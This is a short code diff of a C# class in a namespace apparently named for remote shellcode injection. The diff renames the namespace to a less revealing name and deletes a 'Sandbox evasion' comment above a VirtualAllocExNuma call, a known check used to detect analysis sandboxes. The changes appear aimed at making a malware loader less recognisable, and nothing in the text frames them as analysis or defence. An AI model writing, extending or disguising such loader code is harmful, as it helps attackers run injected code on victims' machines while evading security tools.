@@ -21,7 +21,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 
-namespace RemoteShinjectLowlevel
+namespace RSjectLowlevel
 {
     [ComVisible(true)]
     public class TestClass
@@ -70,9 +70,9 @@ namespace RemoteShinjectLowlevel
 
     [System.Runtime.InteropServices.DllImport("kernel32.dll")]
     static extern IntPtr GetCurrentProcess();
+        
     public TestClass()
     {
-        // Sandbox evasion
         IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
         if (mem == null)
         {
